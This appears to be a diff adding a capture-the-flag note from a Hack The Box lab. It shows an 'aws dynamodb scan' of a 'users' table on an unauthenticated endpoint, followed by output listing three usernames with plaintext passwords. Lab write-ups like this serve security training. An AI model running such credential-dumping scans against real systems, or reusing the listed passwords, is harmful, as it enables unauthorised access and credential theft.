@@ -1,0 +1,34 @@
+# aws dynamodb scan --table-name 'users' --endpoint-url http://s3.bucket.htb
+
+
+{
+    "Items": [
+        {
+            "password": {
+                "S": "Management@#1@#"
+            },
+            "username": {
+                "S": "Mgmt"
+            }
+        },
+        {
+            "password": {
+                "S": "Welcome123!"
+            },
+            "username": {
+                "S": "Cloudadm"
+            }
+        },
+        {
+            "password": {
+                "S": "n2vM-<_K_Q:.Aa2"
+            },
+            "username": {
+                "S": "Sysadm"
+            }
+        }
+    ],
+    "Count": 3,
+    "ScannedCount": 3,
+    "ConsumedCapacity": null
+}
